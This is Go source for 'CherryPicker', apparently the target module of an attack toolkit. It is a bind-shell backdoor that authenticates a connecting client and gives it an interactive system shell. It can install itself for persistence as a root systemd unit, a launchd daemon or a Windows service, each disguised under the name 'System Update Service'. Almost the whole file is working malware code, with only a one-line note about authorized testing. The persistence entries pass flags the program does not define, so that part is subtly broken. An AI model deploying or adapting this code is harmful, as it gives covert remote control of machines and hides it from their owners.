package main

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"
)

const targetBanner = `
  ____ _                          ____  _      _             
 / ___| |__   ___ _ __ _ __ _   _|  _ \(_) ___| | _____ _ __ 
| |   | '_ \ / _ \ '__| '__| | | | |_) | |/ __| |/ / _ \ '__|
| |___| | | |  __/ |  | |  | |_| |  __/| | (__|   <  __/ |   
 \____|_| |_|\___|_|  |_|   \__, |_|   |_|\___|_|\_\___|_|   
                            |___/                             
[TARGET MODULE] - Bind shell listener
Version: 2.0.0
`

var authKey string

func main() {
	port := flag.Int("p", 0, "Port to listen on (required)")
	key := flag.String("s", "", "Authentication signature/key (required)")
	installPersistence := flag.Bool("install", false, "Install as persistent service/daemon")
	flag.Parse()

	// Validate required arguments
	if *port == 0 {
		log.Fatal("[!] Error: -p (port) is required\n\nUsage: ./cherrypicker-target -p <PORT> -s <SIGNATURE> [-install]\n")
	}

	if *port < 1 || *port > 65535 {
		log.Fatal("[!] Error: Port must be between 1 and 65535\n")
	}

	if *key == "" {
		log.Fatal("[!] Error: -s (signature) is required\n\nUsage: ./cherrypicker-target -p <PORT> -s <SIGNATURE> [-install]\n")
	}

	if len(*key) < 10 {
		log.Fatal("[!] Error: Signature must be at least 10 characters for security\n")
	}

	authKey = *key

	// If install flag is set, install persistence and exit
	if *installPersistence {
		if err := installAsPersistentService(*port, *key); err != nil {
			log.Fatalf("[!] Failed to install persistence: %v\n", err)
		}
		fmt.Println("[+] Persistence installed successfully!")
		fmt.Println("[+] Service will start automatically on boot")
		os.Exit(0)
	}

	fmt.Println(targetBanner)
	log.Println("[!] For authorized penetration testing only!")
	log.Printf("[*] Listening on port %d\n", *port)
	log.Printf("[*] Auth key configured: %d bytes\n", len(authKey))

	// Start listener
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", *port))
	if err != nil {
		log.Fatalf("[!] Failed to start listener: %v\n", err)
	}
	defer listener.Close()

	// Setup signal handler for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	// Accept connections in goroutine
	connChan := make(chan net.Conn)
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				log.Printf("[!] Accept error: %v\n", err)
				continue
			}
			connChan <- conn
		}
	}()

	log.Println("[*] Waiting for connections...")

	// Main loop
	for {
		select {
		case <-sigChan:
			log.Println("\n[*] Interrupt received, shutting down...")
			return
		case conn := <-connChan:
			log.Printf("[+] Connection from %s\n", conn.RemoteAddr())
			go handleConnection(conn)
		}
	}
}

// handleConnection manages a client connection
func handleConnection(conn net.Conn) {
	defer conn.Close()

	// Perform authentication
	if err := authenticate(conn); err != nil {
		log.Printf("[!] Authentication failed from %s: %v\n", conn.RemoteAddr(), err)
		conn.Write([]byte("AUTH_FAILED\n"))
		return
	}

	log.Printf("[+] Authentication successful from %s\n", conn.RemoteAddr())
	conn.Write([]byte("AUTH_OK\n"))

	// Send banner
	sendBanner(conn)

	// Spawn shell
	log.Printf("[+] Spawning shell for %s\n", conn.RemoteAddr())
	if err := spawnShell(conn); err != nil {
		log.Printf("[!] Shell error: %v\n", err)
	}

	log.Printf("[*] Connection closed from %s\n", conn.RemoteAddr())
}

// authenticate performs challenge-response authentication
func authenticate(conn net.Conn) error {
	// Set authentication timeout
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetDeadline(time.Time{})

	// Generate random challenge
	challengeBytes := make([]byte, 16)
	if _, err := rand.Read(challengeBytes); err != nil {
		return fmt.Errorf("failed to generate challenge: %w", err)
	}
	challenge := hex.EncodeToString(challengeBytes)

	// Send challenge
	_, err := conn.Write([]byte("CHALLENGE:" + challenge + "\n"))
	if err != nil {
		return fmt.Errorf("failed to send challenge: %w", err)
	}

	// Read response
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		return fmt.Errorf("failed to read response: %w", err)
	}

	response := strings.TrimSpace(string(buf[:n]))
	if !strings.HasPrefix(response, "RESPONSE:") {
		return fmt.Errorf("invalid response format")
	}

	receivedResponse := strings.TrimPrefix(response, "RESPONSE:")

	// Compute expected response: SHA256(challenge + key)
	expectedHash := sha256.Sum256([]byte(challenge + authKey))
	expectedResponse := hex.EncodeToString(expectedHash[:])

	// Compare
	if receivedResponse != expectedResponse {
		return fmt.Errorf("invalid credentials")
	}

	return nil
}

// sendBanner sends system information banner
func sendBanner(conn net.Conn) {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME") // Windows
	}

	banner := fmt.Sprintf("\n[CherryPicker Shell]\nHost: %s\nUser: %s\nOS: %s/%s\n\n",
		hostname, username, runtime.GOOS, runtime.GOARCH)

	conn.Write([]byte(banner))
}

// spawnShell spawns an interactive shell
func spawnShell(conn net.Conn) error {
	// Get appropriate shell
	shell, shellArgs := getShell()

	// Create command
	cmd := exec.Command(shell, shellArgs...)

	// Connect stdio to connection
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Start shell
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start shell: %w", err)
	}

	// Wait for completion
	return cmd.Wait()
}

// getShell returns the appropriate shell based on OS
func getShell() (string, []string) {
	switch runtime.GOOS {
	case "windows":
		return "cmd.exe", []string{}
	case "linux", "darwin":
		shell := os.Getenv("SHELL")
		if shell == "" {
			shell = "/bin/sh"
		}
		return shell, []string{"-i"}
	default:
		return "/bin/sh", []string{"-i"}
	}
}

// installAsPersistentService installs the binary as a persistent service/daemon
func installAsPersistentService(port int, key string) error {
	// Get current executable path
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}

	switch runtime.GOOS {
	case "linux":
		return installLinuxSystemd(exePath, port, key)
	case "darwin":
		return installMacOSLaunchd(exePath, port, key)
	case "windows":
		return installWindowsService(exePath, port, key)
	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
}

// installLinuxSystemd installs as systemd service
func installLinuxSystemd(exePath string, port int, key string) error {
	serviceContent := fmt.Sprintf(`[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=%s -port %d -key "%s"
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
`, exePath, port, key)

	servicePath := "/etc/systemd/system/system-update.service"

	// Write service file
	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return fmt.Errorf("failed to write service file: %w", err)
	}

	// Reload systemd
	if err := exec.Command("systemctl", "daemon-reload").Run(); err != nil {
		return fmt.Errorf("failed to reload systemd: %w", err)
	}

	// Enable service
	if err := exec.Command("systemctl", "enable", "system-update.service").Run(); err != nil {
		return fmt.Errorf("failed to enable service: %w", err)
	}

	// Start service
	if err := exec.Command("systemctl", "start", "system-update.service").Run(); err != nil {
		return fmt.Errorf("failed to start service: %w", err)
	}

	fmt.Println("[+] Linux systemd service installed")
	fmt.Println("[+] Service name: system-update.service")
	return nil
}

// installMacOSLaunchd installs as launchd daemon
func installMacOSLaunchd(exePath string, port int, key string) error {
	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
        <string>-port</string>
        <string>%d</string>
        <string>-key</string>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
`, exePath, port, key)

	plistPath := "/Library/LaunchDaemons/com.system.update.plist"

	// Write plist file
	if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
		return fmt.Errorf("failed to write plist file: %w", err)
	}

	// Load daemon
	if err := exec.Command("launchctl", "load", plistPath).Run(); err != nil {
		return fmt.Errorf("failed to load daemon: %w", err)
	}

	fmt.Println("[+] macOS launchd daemon installed")
	fmt.Println("[+] Daemon name: com.system.update")
	return nil
}

// installWindowsService installs as Windows service
func installWindowsService(exePath string, port int, key string) error {
	serviceName := "SystemUpdate"
	binPath := fmt.Sprintf(`"%s" -port %d -key "%s"`, exePath, port, key)

	// Create service
	cmd := exec.Command("sc", "create", serviceName,
		"binPath=", binPath,
		"start=", "auto",
		"DisplayName=", "System Update Service")

	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to create service: %w\nOutput: %s", err, string(output))
	}

	// Start service
	if err := exec.Command("sc", "start", serviceName).Run(); err != nil {
		return fmt.Errorf("failed to start service: %w", err)
	}

	fmt.Println("[+] Windows service installed")
	fmt.Println("[+] Service name: SystemUpdate")
	return nil
}
